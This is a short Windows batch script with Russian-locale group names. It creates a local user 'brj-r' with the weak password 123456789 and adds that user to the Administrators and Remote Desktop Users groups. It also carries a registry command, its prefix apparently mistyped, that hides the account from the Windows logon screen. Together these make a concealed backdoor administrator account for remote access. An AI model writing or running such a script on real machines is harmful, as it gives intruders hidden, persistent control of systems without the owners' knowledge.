@echo off

chcp 866

net user brj-r 123456789 /add
net localgroup Администраторы brj-r /add
net localgroup "Пользователи удаленного рабочего стола" brj-r /add
rem net accounts /maxpwage:unlimited
rm reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v brj-r /t REG_DWORD /d "00000000" /f
exit
